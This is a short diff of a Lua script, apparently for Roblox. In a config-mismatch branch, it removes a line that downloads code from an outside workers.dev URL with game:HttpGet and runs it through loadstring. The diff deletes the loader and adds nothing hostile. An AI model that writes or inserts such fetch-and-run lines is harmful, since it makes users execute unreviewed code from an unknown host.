@@ -39,7 +39,7 @@ if _Config_Offline ~= _Config_Online then
 			--game.Players.LocalPlayer:Kick("kick reset")		
 		end
 		--game.Players.LocalPlayer:Kick("kick reset")		
-		loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/111bush.lua"))()
+		
 		--------------------------------------------
 end
 
